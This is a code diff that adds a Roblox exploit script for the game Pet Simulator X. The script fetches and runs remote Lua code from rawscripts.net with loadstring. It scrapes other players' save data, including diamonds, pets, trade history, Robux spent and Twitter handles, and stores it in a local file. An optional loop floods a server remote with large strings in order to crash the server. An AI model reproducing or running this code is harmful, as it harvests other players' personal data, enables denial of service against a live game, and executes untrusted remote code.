@@ -1,0 +1,131 @@
+local saveTradeHistory = false
+--set that to true if you want to save logs of every player they have traded to, its a bunch of data though
+
+local serverCrash = false
+
+local commonHandles = loadstring(game:HttpGet("https://rawscripts.net/raw/Pet-Simulator-X!-commonscrapernames-3767"))()
+local petNet = loadstring(game:HttpGet("https://rawscripts.net/raw/Pet-Simulator-X!-PSX-Safe-Networking-3732"))()
+local teleportThing = loadstring(game:HttpGet("https://rawscripts.net/raw/Pet-Simulator-X!-TeleportThing-3732"))()
+--teleportThing isnt mine aaaaa
+task.spawn(function()--in case server breaks
+   task.wait(45)
+   teleportThing()
+end)
+
+local httpService = game:GetService("HttpService")
+local players = game:GetService("Players")
+
+petNet:waitForLoad()
+local localPlayer = players.LocalPlayer
+
+local saveData = petNet:getPath("Save","Get")
+
+local hugeIds = {157,225,239,266,274,291,292,307,308,309,316,317,329,330,331,351,352,353}
+
+local function getHighestCounter(inputTable)
+   local counter = 0
+   local eggName = "Cracked Egg"
+   for i,v in next, inputTable do
+       if v > counter then
+           eggName = i
+           counter = v
+       end
+   end
+   return eggName, counter
+end
+
+local function calculateHuges(inputTable)
+   local number = 0
+   for i,v in next, inputTable do
+       if table.find(hugeIds, v.idt) then
+           number = number + 1 -- a lot of shitty exploits dont support ++ and +=
+       end
+   end
+   return number > 0 and number or false
+end
+
+local function simpleTradeHistory(inputPlayer,inputTable)
+   local outputTable = {}
+   --local alreadyTraded = {}
+   for i,v in next, inputTable do
+       if typeof(v)=="table" then
+           local playerName = v[2]~=inputPlayer and v[2] or v[1]
+           
+           local hasAlreadyTraded = outputTable[playerName]
+           if not hasAlreadyTraded then
+               outputTable[playerName] = {inputPlayer, playerName, 1}
+           else
+               outputTable[playerName][3] = outputTable[playerName][3] + 1
+           end
+       end
+   end
+   return outputTable
+end
+
+local function readData(player)
+   local playerData = saveData(player)
+   if playerData then
+       local pets, openedEggs, tradeData, diamonds = playerData.Pets, playerData.EggsOpened, playerData.TradeHistory, math.floor(playerData.Diamonds)
+       local isFollowing, robuxSpent = playerData.IsFollowingOnTwitter, playerData.RobuxSpent--getting spicier
+       local twitterUsername = (isFollowing and playerData.TwitterUsername and not table.find(commonHandles,string.lower(playerData.TwitterUsername))) and playerData.TwitterUsername or nil--owo
+       
+       local mostOpenedEgg, eggNumber = getHighestCounter(openedEggs)
+       local hugeAmount = calculateHuges(pets)
+       local tradeHistory = simpleTradeHistory(player.Name,tradeData)
+       local robuxSpent = robuxSpent > 0 and robuxSpent or nil
+       
+       filteredData = {
+           MostOpenedEgg = {mostOpenedEgg, eggNumber},
+           Diamonds = diamonds
+       }
+       if saveTradeHistory then
+           filteredData["TradeHistory"] = tradeHistory
+       end
+       if hugeAmount then
+           filteredData["AmountOfHuges"] = hugeAmount
+       end
+       if robuxSpent then
+           filteredData["RobuxSpent"] = robuxSpent
+       end
+       if twitterUsername then
+           filteredData["TwitterHandle"] = twitterUsername
+       end
+       return filteredData
+   end
+end
+
+
+if not isfile("psxdata.txt") then
+   writefile("psxdata.txt","{}")
+end
+
+local function encode(data)
+   return httpService:JSONEncode(data)
+end
+
+local function decode(data)
+   return httpService:JSONDecode(data)
+end
+
+local dataTable = decode(readfile("psxdata.txt"))
+
+
+for i,v in ipairs(players:GetPlayers()) do
+   if i~=1 and not dataTable[v.Name] then
+       dataTable[v.Name] = readData(v)
+   end
+end
+
+writefile("psxdata.txt",encode(dataTable))
+
+
+local remote = workspace["__THINGS"]["__REMOTES"]["MAIN"]
+task.spawn(function()
+  while task.wait() and serverCrash do
+      remote:FireServer("b",tostring(tick()):rep(100))--preston, fix when?
+  end
+end)
+if serverCrash then
+   wait(5)
+end
+teleportThing()
